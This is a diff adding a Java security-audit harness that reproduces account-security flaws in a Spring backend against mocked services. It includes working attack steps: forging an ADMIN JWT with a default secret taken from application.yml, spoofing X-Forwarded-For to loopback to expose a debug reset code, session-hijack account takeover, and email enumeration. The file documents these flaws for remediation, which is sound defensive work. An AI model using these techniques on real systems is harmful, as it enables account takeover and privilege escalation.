@@ -1,0 +1,225 @@
+import com.baomidou.mybatisplus.core.MybatisConfiguration;
+import com.baomidou.mybatisplus.core.metadata.TableInfoHelper;
+import com.fasterxml.jackson.databind.ObjectMapper;
+import com.qzcy.backend.config.security.JwtAuthenticationFilter;
+import com.qzcy.backend.controller.AuthController;
+import com.qzcy.backend.dto.*;
+import com.qzcy.backend.entity.MailConfig;
+import com.qzcy.backend.entity.User;
+import com.qzcy.backend.exception.BusinessException;
+import com.qzcy.backend.mapper.UserMapper;
+import com.qzcy.backend.service.*;
+import com.qzcy.backend.service.impl.*;
+import com.qzcy.backend.util.JwtUtil;
+import io.jsonwebtoken.Jwts;
+import io.jsonwebtoken.security.Keys;
+import org.apache.ibatis.builder.MapperBuilderAssistant;
+import org.springframework.mock.web.MockHttpServletRequest;
+import org.springframework.mock.web.MockHttpServletResponse;
+import org.springframework.security.core.context.SecurityContextHolder;
+import org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;
+import org.springframework.test.util.ReflectionTestUtils;
+
+import java.nio.charset.StandardCharsets;
+import java.nio.file.Files;
+import java.nio.file.Path;
+import java.util.Date;
+import java.util.Map;
+import java.util.concurrent.atomic.AtomicReference;
+
+import static org.mockito.ArgumentMatchers.*;
+import static org.mockito.Mockito.*;
+
+/**
+ * Isolated evidence harness for the 2026-10-18 audit, NOT a security regression suite.
+ * PASS means the named vulnerable behavior was reproduced. Uses only mocked storage/mail.
+ * Deliberately outside src/test: after remediation these observations should stop passing.
+ */
+public class AccountSecurityAudit {
+    private static final String TEST_SECRET = "audit-only-random-example-secret-which-is-not-used-in-production";
+    private final UserMapper users = mock(UserMapper.class);
+    private final BCryptPasswordEncoder encoder = new BCryptPasswordEncoder(4);
+    private final JwtUtil jwt = jwt(TEST_SECRET);
+    private final User victim = new User();
+    private final AtomicReference<String> deliveredCode = new AtomicReference<>();
+    private final MailConfig config = new MailConfig();
+    private final EmailCodeServiceImpl codes;
+    private final AuthServiceImpl auth;
+    private final UserServiceImpl profiles;
+
+    private AccountSecurityAudit() {
+        TableInfoHelper.initTableInfo(new MapperBuilderAssistant(new MybatisConfiguration(), ""), User.class);
+        victim.setId(900001L);
+        victim.setUsername("auditvictim");
+        victim.setEmail("victim@example.invalid");
+        victim.setPassword(encoder.encode("VictimOriginalPassword!"));
+        victim.setRole("USER");
+        victim.setBanned(false);
+        when(users.selectById(victim.getId())).thenReturn(victim);
+        when(users.updateById(any(User.class))).thenReturn(1);
+        when(users.selectOne(any())).thenAnswer(call -> {
+            com.baomidou.mybatisplus.core.conditions.query.LambdaQueryWrapper<User> query = call.getArgument(0);
+            String sql = query.getSqlSegment();
+            Object account = query.getParamNameValuePairs().get("MPGENVAL1");
+            return (sql.contains("email") && victim.getEmail().equals(account))
+                    || (sql.contains("username") && victim.getUsername().equals(account)) ? victim : null;
+        });
+        MailConfigService mailConfig = mock(MailConfigService.class);
+        config.setEnabled(true);
+        config.setDevReturnCode(false);
+        when(mailConfig.current()).thenReturn(config);
+        MailDeliveryService delivery = mock(MailDeliveryService.class);
+        doAnswer(call -> { deliveredCode.set(call.getArgument(2)); return null; })
+                .when(delivery).sendVerificationCode(anyString(), anyString(), anyString());
+        codes = new EmailCodeServiceImpl(mailConfig, delivery, new EmailCodeRateLimiter(), users,
+                mock(RegistrationConfigService.class));
+        auth = new AuthServiceImpl(users, encoder, jwt, codes, mock(PaymentConfigService.class),
+                mock(ReferralService.class), mock(RegistrationConfigService.class));
+        profiles = new UserServiceImpl(users, encoder);
+    }
+
+    public static void main(String[] args) throws Exception {
+        AccountSecurityAudit audit = new AccountSecurityAudit();
+        audit.takeoverAndOldSession();
+        audit.unlimitedLoginAttempts();
+        audit.publicDefaultSecret(Path.of(args[0]));
+        new AccountSecurityAudit().forwardedLoopbackDebugCode();
+        audit.existingEmailEnumeration();
+        audit.controls();
+        System.out.println("Observed 6 vulnerable behaviors; no database, SMTP or network calls were made.");
+    }
+
+    private void takeoverAndOldSession() throws Exception {
+        String stolenSession = jwt.generateToken(victim);
+        require(authenticated(stolenSession, jwt), "Original session must authenticate");
+        when(users.selectCount(any())).thenReturn(0L);
+        UserProfileDto profile = new UserProfileDto();
+        profile.setEmail("attacker@example.invalid");
+        profiles.updateProfile(victim.getId(), profile);
+        when(users.selectCount(any())).thenReturn(1L);
+        codes.sendCode(victim.getEmail(), "forgot_password", "198.51.100.10");
+        ForgotPasswordDto reset = new ForgotPasswordDto();
+        reset.setEmail(victim.getEmail());
+        reset.setCode(deliveredCode.get());
+        reset.setNewPassword("AttackerReplacementPassword!");
+        auth.resetPassword(reset);
+        require(encoder.matches(reset.getNewPassword(), victim.getPassword()), "Reset must persist replacement hash");
+        LoginDto login = new LoginDto();
+        login.setAccount(victim.getEmail());
+        login.setPassword(reset.getNewPassword());
+        require(auth.login(login).getUser().getId().equals(victim.getId()), "New password must log in to victim account");
+        observed("Stolen session changes email and resets password without original password/email approval");
+        require(authenticated(stolenSession, jwt), "Old session remains authenticated after password reset");
+        ChangePasswordDto change = new ChangePasswordDto();
+        change.setOldPassword(reset.getNewPassword());
+        change.setNewPassword("VictimRecoveredPassword!");
+        profiles.changePassword(victim.getId(), change);
+        require(authenticated(stolenSession, jwt), "Old session remains authenticated after password change");
+        observed("Old session survives both password reset and password change");
+    }
+
+    private void unlimitedLoginAttempts() {
+        LoginDto login = new LoginDto();
+        login.setAccount(victim.getUsername());
+        login.setPassword("wrong-password");
+        for (int i = 0; i < 30; i++) {
+            try { auth.login(login); throw new AssertionError("Incorrect password accepted"); }
+            catch (BusinessException ex) { require(ex.getCode() == 401, "No throttling expected in vulnerable baseline"); }
+        }
+        login.setPassword("VictimRecoveredPassword!");
+        require(auth.login(login).getToken() != null, "Login immediately succeeds after 30 failures");
+        observed("30 consecutive failed logins do not trigger throttling or temporary lockout");
+    }
+
+    private void publicDefaultSecret(Path applicationYaml) throws Exception {
+        String yaml = Files.readString(applicationYaml);
+        String marker = "${JWT_SECRET:";
+        int start = yaml.indexOf(marker);
+        require(start >= 0, "Default JWT secret remains in application.yml");
+        start += marker.length();
+        String defaultSecret = yaml.substring(start, yaml.indexOf('}', start));
+        String forged = Jwts.builder().subject("unrelated-name")
+                .claim("userId", victim.getId()).claim("role", "ADMIN")
+                .issuedAt(new Date()).expiration(new Date(System.currentTimeMillis() + 60000))
+                .signWith(Keys.hmacShaKeyFor(defaultSecret.getBytes(StandardCharsets.UTF_8))).compact();
+        require(authenticated(forged, jwt(defaultSecret)), "Default-key installation accepts externally signed identity");
+        require(!jwt.validateToken(forged), "Strong unrelated key must reject forgery");
+        observed("An externally signed token impersonates an existing user when the public default key is deployed");
+    }
+
+    private void forwardedLoopbackDebugCode() {
+        when(users.selectCount(any())).thenReturn(1L);
+        config.setEnabled(false);
+        config.setDevReturnCode(true);
+        // Simulate a directly exposed backend reached through a loopback reverse proxy.
+        // This is conditional: bundled nginx overwrites X-Forwarded-For and prevents this spoof.
+        MockHttpServletRequest request = new MockHttpServletRequest();
+        request.setRemoteAddr("127.0.0.1");
+        request.addHeader("X-Forwarded-For", "127.0.0.1");
+        EmailCodeDto dto = new EmailCodeDto();
+        dto.setEmail(victim.getEmail());
+        dto.setScene("forgot_password");
+        var controller = new AuthController(auth, codes);
+        var response = controller.sendEmailCode(dto, request);
+        require(response.getData() instanceof Map<?, ?>, "Expected controller response");
+        require(((Map<?, ?>) response.getData()).containsKey("devCode"), "Spoofed loopback exposes code");
+        observed("Debug code is exposed with disabled mail, devReturnCode and a trusted spoofed loopback IP");
+    }
+
+    private void existingEmailEnumeration() {
+        ForgotPasswordDto dto = new ForgotPasswordDto();
+        dto.setNewPassword("ExampleReplacementPassword!");
+        dto.setCode("not-a-valid-code");
+        dto.setEmail("unknown@example.invalid");
+        int unknown = resetError(dto);
+        dto.setEmail(victim.getEmail());
+        int known = resetError(dto);
+        require(unknown == 404 && known == 400, "Different errors reveal registered email");
+        observed("Password reset distinguishes registered from unknown email before code verification");
+    }
+
+    private int resetError(ForgotPasswordDto dto) {
+        try { auth.resetPassword(dto); throw new AssertionError("Invalid reset unexpectedly succeeded"); }
+        catch (BusinessException ex) { return ex.getCode(); }
+    }
+
+    private void controls() throws Exception {
+        ChangePasswordDto change = new ChangePasswordDto();
+        change.setOldPassword("unknown-to-attacker");
+        change.setNewPassword("ExampleReplacementPassword!");
+        try { profiles.changePassword(victim.getId(), change); throw new AssertionError("Old password check bypassed"); }
+        catch (BusinessException ex) { require(ex.getCode() == 401, "Wrong original password must fail"); }
+        require(!authenticated("sk-audit-fake-relay-key", jwt), "Relay API key is not a website JWT");
+        victim.setBanned(true);
+        require(!authenticated(jwt.generateToken(victim), jwt), "Banned account must not authenticate");
+        victim.setBanned(false);
+        System.out.println("CONTROL: Wrong original password and relay key rejected; ban blocks website JWT");
+        require(new ObjectMapper().readTree(new ObjectMapper().writeValueAsString(victim)).has("password"),
+                "User response currently serializes password hash");
+        System.out.println("OBSERVED: User entity serialization includes password hash (admin endpoints return this entity)");
+    }
+
+    private boolean authenticated(String token, JwtUtil verifier) throws Exception {
+        SecurityContextHolder.clearContext();
+        try {
+            MockHttpServletRequest request = new MockHttpServletRequest("GET", "/api/user/me");
+            request.addHeader("Authorization", "Bearer " + token);
+            new JwtAuthenticationFilter(verifier, users).doFilter(request, new MockHttpServletResponse(), (req, res) -> {});
+            var authentication = SecurityContextHolder.getContext().getAuthentication();
+            return authentication != null && authentication.isAuthenticated();
+        } finally { SecurityContextHolder.clearContext(); }
+    }
+
+    private static JwtUtil jwt(String secret) {
+        JwtUtil jwt = new JwtUtil();
+        ReflectionTestUtils.setField(jwt, "secret", secret);
+        ReflectionTestUtils.setField(jwt, "expirationMs", 86400000L);
+        return jwt;
+    }
+
+    private static void require(boolean condition, String message) {
+        if (!condition) throw new AssertionError(message);
+    }
+
+    private static void observed(String message) { System.out.println("OBSERVED: " + message); }
+}
